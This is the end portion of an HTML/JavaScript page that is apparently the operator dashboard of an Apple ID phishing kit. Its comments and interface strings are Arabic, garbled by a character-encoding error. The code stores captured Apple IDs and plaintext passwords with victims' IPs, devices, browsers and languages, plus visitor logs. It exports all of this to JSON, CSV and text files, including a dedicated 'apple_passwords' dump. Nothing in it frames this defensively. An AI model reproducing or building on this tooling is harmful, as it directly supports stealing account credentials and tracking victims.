                localStorage.removeItem('dashboard_settings');
                loadSettings();
                showNotification('ØªÙ… Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª', 'success');
            }
        }
        
        // ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        function exportData(format) {
            try {
                const data = {
                    credentials: credentials,
                    visits: visits,
                    kelog: kelogEntries,
                    exportedAt: new Date().toISOString(),
                    total: credentials.length + visits.length + kelogEntries.length
                };
                
                let content, filename, mimeType;
                
                switch (format) {
                    case 'json':
                        content = JSON.stringify(data, null, 2);
                        filename = `apple_data_${Date.now()}.json`;
                        mimeType = 'application/json';
                        break;
                        
                    case 'csv':
                        content = convertToCSV(data);
                        filename = `apple_data_${Date.now()}.csv`;
                        mimeType = 'text/csv';
                        break;
                        
                    case 'txt':
                        content = convertToTXT(data);
                        filename = `apple_data_${Date.now()}.txt`;
                        mimeType = 'text/plain';
                        break;
                        
                    default:
                        showNotification('ØªÙ†Ø³ÙŠÙ‚ ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ', 'error');
                        return;
                }
                
                downloadFile(content, filename, mimeType);
                showNotification(`ØªÙ… ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙƒÙ€ ${format.toUpperCase()}`, 'success');
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:', error);
                showNotification('Ø®Ø·Ø£ ÙÙŠ ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', 'error');
            }
        }
        
        // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ CSV
        function convertToCSV(data) {
            let csv = 'Type,AppleID,Password,IP,Time,Device,Browser,Screen,Language\n';
            
            // Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„
            data.credentials.forEach(cred => {
                const isMobile = cred.isMobile ? 'mobile' : 'desktop';
                const browser = getBrowserName(cred.userAgent);
                csv += `Credential,"${cred.appleId}","${cred.password}","${cred.ip}","${cred.timestamp}","${isMobile}","${browser}","${cred.screen}","${cred.language}"\n`;
            });
            
            return csv;
        }
        
        // ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ Ù†Øµ
        function convertToTXT(data) {
            let text = '='.repeat(80) + '\n';
            text += 'ØªÙ‚Ø±ÙŠØ± Ø¨ÙŠØ§Ù†Ø§Øª Apple Ø§Ù„ÙƒØ§Ù…Ù„\n';
            text += '='.repeat(80) + '\n\n';
            
            text += 'ğŸ“Š Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª:\n';
            text += 'â”€'.repeat(40) + '\n';
            text += `â€¢ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„: ${data.credentials.length}\n`;
            text += `â€¢ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª: ${data.visits.length}\n`;
            text += `â€¢ Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…: ${data.kelog.length}\n`;
            text += `â€¢ Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ: ${data.total}\n\n`;
            
            text += 'ğŸ” Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„:\n';
            text += 'â”€'.repeat(40) + '\n';
            data.credentials.forEach((cred, index) => {
                text += `\n${index + 1}. ${cred.appleId}\n`;
                text += `   ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: ${cred.password}\n`;
                text += `   IP: ${cred.ip}\n`;
                text += `   Ø§Ù„ÙˆÙ‚Øª: ${new Date(cred.timestamp).toLocaleString('ar-SA')}\n`;
                text += `   Ø§Ù„Ø¬Ù‡Ø§Ø²: ${cred.isMobile ? 'Ù‡Ø§ØªÙ' : 'ÙƒÙ…Ø¨ÙŠÙˆØªØ±'}\n`;
            });
            
            text += '\nğŸ‘€ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª:\n';
            text += 'â”€'.repeat(40) + '\n';
            data.visits.forEach((visit, index) => {
                text += `\n${index + 1}. ${visit.ip}\n`;
                text += `   Ø§Ù„ÙˆÙ‚Øª: ${new Date(visit.timestamp || visit.time).toLocaleString('ar-SA')}\n`;
                text += `   Ø§Ù„Ø¬Ù‡Ø§Ø²: ${visit.isMobile ? 'Ù‡Ø§ØªÙ' : 'ÙƒÙ…Ø¨ÙŠÙˆØªØ±'}\n`;
                text += `   Ø§Ù„Ù…ØªØµÙØ­: ${getBrowserName(visit.userAgent)}\n`;
            });
            
            text += '\nğŸ“Š Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…:\n';
            text += 'â”€'.repeat(40) + '\n';
            data.kelog.forEach((log, index) => {
                text += `\n${index + 1}. ${log.action}\n`;
                text += `   Ø§Ù„Ù†ÙˆØ¹: ${log.type}\n`;
                text += `   Ø§Ù„ÙˆÙ‚Øª: ${new Date(log.timestamp).toLocaleString('ar-SA')}\n`;
            });
            
            text += '\n' + '='.repeat(80) + '\n';
            text += `Ù…ÙØµØ¯Ø± ÙÙŠ: ${new Date(data.exportedAt).toLocaleString('ar-SA')}\n`;
            text += '='.repeat(80);
            
            return text;
        }
        
        // ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù
        function downloadFile(content, filename, mimeType) {
            try {
                const blob = new Blob([content], { type: mimeType });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                setTimeout(() => {
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                }, 100);
                
                return true;
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù:', error);
                return false;
            }
        }
        
        // ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ù…Ø³Ø§Ø¹Ø¯Ø©
        function refreshAllData() {
            loadAllData();
            showNotification('ØªÙ… ØªØ­Ø¯ÙŠØ« Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', 'success');
        }
        
        function refreshCredentials() {
            loadCredentials();
            showNotification('ØªÙ… ØªØ­Ø¯ÙŠØ« Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„', 'success');
        }
        
        function refreshKelog() {
            loadKelog();
            showNotification('ØªÙ… ØªØ­Ø¯ÙŠØ« Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…', 'success');
        }
        
        function clearAllData() {
            if (confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§ØªØŸ Ù‡Ø°Ø§ Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ØªØ±Ø§Ø¬Ø¹ Ø¹Ù†Ù‡.')) {
                credentials = [];
                visits = [];
                kelogEntries = [];
                
                // Ù…Ø³Ø­ Ø§Ù„ØªØ®Ø²ÙŠÙ†
                if (typeof localStorage !== 'undefined') {
                    localStorage.removeItem('apple_credentials');
                    localStorage.removeItem('apple_visits');
                    localStorage.removeItem('kelog_system');
                }
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¹Ø±Ø¶
                displayCredentials();
                displayVisits();
                displayKelog();
                updateStats();
                
                showNotification('ØªÙ… Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', 'success');
            }
        }
        
        function clearKelog() {
            if (confirm('Ù‡Ù„ ØªØ±ÙŠØ¯ Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…ØŸ')) {
                kelogEntries = [];
                
                // Ù…Ø³Ø­ Ø§Ù„ØªØ®Ø²ÙŠÙ†
                if (typeof localStorage !== 'undefined') {
                    localStorage.removeItem('kelog_system');
                }
                
                // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¹Ø±Ø¶
                displayKelog();
                updateStats();
                
                showNotification('ØªÙ… Ø­Ø°Ù Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…', 'success');
            }
        }
        
        // ØªØµØ¯ÙŠØ± ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± ÙÙ‚Ø·
        function exportCredentialsOnly() {
            if (credentials.length === 0) {
                showNotification('Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„ Ù„Ù„ØªØµØ¯ÙŠØ±', 'warning');
                return;
            }
            
            let text = 'ğŸ” ÙƒÙ„Ù…Ø§Øª Ù…Ø±ÙˆØ± Apple Ø§Ù„Ù…Ø³Ø¬Ù„Ø©\n';
            text += '='.repeat(50) + '\n\n';
            
            credentials.forEach((cred, index) => {
                text += `${index + 1}. ${cred.appleId}\n`;
                text += `   ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: ${cred.password}\n`;
                text += `   Ø§Ù„ÙˆÙ‚Øª: ${new Date(cred.timestamp).toLocaleString('ar-SA')}\n`;
                text += `   IP: ${cred.ip}\n`;
                text += '   ' + '-'.repeat(30) + '\n\n';
            });
            
            downloadFile(text, `apple_passwords_${Date.now()}.txt`, 'text/plain');
            showNotification('ØªÙ… ØªØµØ¯ÙŠØ± ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±', 'success');
        }
        
        // ØªØµØ¯ÙŠØ± Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª ÙÙ‚Ø·
        function exportVisitsOnly() {
            if (visits.length === 0) {
                showNotification('Ù„Ø§ ØªÙˆØ¬Ø¯ Ø²ÙŠØ§Ø±Ø§Øª Ù„Ù„ØªØµØ¯ÙŠØ±', 'warning');
                return;
            }
            
            let text = 'ğŸ‘€ Ø²ÙŠØ§Ø±Ø§Øª Ù†Ø¸Ø§Ù… Apple\n';
            text += '='.repeat(50) + '\n\n';
            
            visits.forEach((visit, index) => {
                text += `${index + 1}. ${visit.ip}\n`;
                text += `   Ø§Ù„ÙˆÙ‚Øª: ${new Date(visit.timestamp || visit.time).toLocaleString('ar-SA')}\n`;
                text += `   Ø§Ù„Ø¬Ù‡Ø§Ø²: ${visit.isMobile ? 'Ù‡Ø§ØªÙ' : 'ÙƒÙ…Ø¨ÙŠÙˆØªØ±'}\n`;
                text += `   Ø§Ù„Ù…ØªØµÙØ­: ${getBrowserName(visit.userAgent)}\n`;
                text += `   Ø§Ù„Ø¯Ù‚Ø©: ${visit.screen}\n`;
                text += '   ' + '-'.repeat(30) + '\n\n';
            });
            
            downloadFile(text, `apple_visits_${Date.now()}.txt`, 'text/plain');
            showNotification('ØªÙ… ØªØµØ¯ÙŠØ± Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª', 'success');
        }
        
        // ØªØµØ¯ÙŠØ± Ø³Ø¬Ù„Ø§Øª Kelog ÙÙ‚Ø·
        function exportKelogOnly() {
            if (kelogEntries.length === 0) {
                showNotification('Ù„Ø§ ØªÙˆØ¬Ø¯ Ø³Ø¬Ù„Ø§Øª Ù„Ù„ØªØµØ¯ÙŠØ±', 'warning');
                return;
            }
            
            let text = 'ğŸ“Š Ø³Ø¬Ù„Ø§Øª Ù†Ø¸Ø§Ù… Kelog\n';
            text += '='.repeat(50) + '\n\n';
            
            kelogEntries.forEach((log, index) => {
                text += `${index + 1}. ${log.action}\n`;
                text += `   Ø§Ù„Ù†ÙˆØ¹: ${log.type}\n`;
                text += `   Ø§Ù„ÙˆÙ‚Øª: ${new Date(log.timestamp).toLocaleString('ar-SA')}\n`;
                text += `   Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª: ${JSON.stringify(log.data, null, 2)}\n`;
                text += '   ' + '-'.repeat(30) + '\n\n';
            });
            
            downloadFile(text, `apple_kelog_${Date.now()}.txt`, 'text/plain');
            showNotification('ØªÙ… ØªØµØ¯ÙŠØ± Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…', 'success');
        }
        
        // ØªØµØ¯ÙŠØ± Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª
        function exportAllFiles() {
            exportCredentialsOnly();
            setTimeout(() => exportVisitsOnly(), 500);
            setTimeout(() => exportKelogOnly(), 1000);
            setTimeout(() => showNotification('ØªÙ… ØªØµØ¯ÙŠØ± Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª', 'success'), 1500);
        }
        
        // Ø¹Ø±Ø¶ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…
        function showSystemInfo() {
            const info = `
                ğŸ–¥ï¸ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…:
                â€¢ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${navigator.platform}
                â€¢ Ø§Ù„Ù…ØªØµÙØ­: ${navigator.userAgent.substring(0, 100)}
                â€¢ Ø§Ù„Ø¯Ù‚Ø©: ${screen.width}x${screen.height}
                â€¢ Ø§Ù„Ù„ØºØ©: ${navigator.language}
                â€¢ Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø­Ù„ÙŠ: ${typeof localStorage !== 'undefined' ? 'Ù…Ø¯Ø¹ÙˆÙ…' : 'ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…'}
                â€¢ IndexedDB: ${window.indexedDB ? 'Ù…Ø¯Ø¹ÙˆÙ…' : 'ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…'}
                â€¢ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„: ${credentials.length}
                â€¢ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª: ${visits.length}
                â€¢ Ø³Ø¬Ù„Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…: ${kelogEntries.length}
                â€¢ ÙˆÙ‚Øª Ø§Ù„ØªØ´ØºÙŠÙ„: ${Math.round(performance.now() / 1000)} Ø«Ø§Ù†ÙŠØ©
            `;
            
            alert(info);
        }
    </script>
</body>
</html>
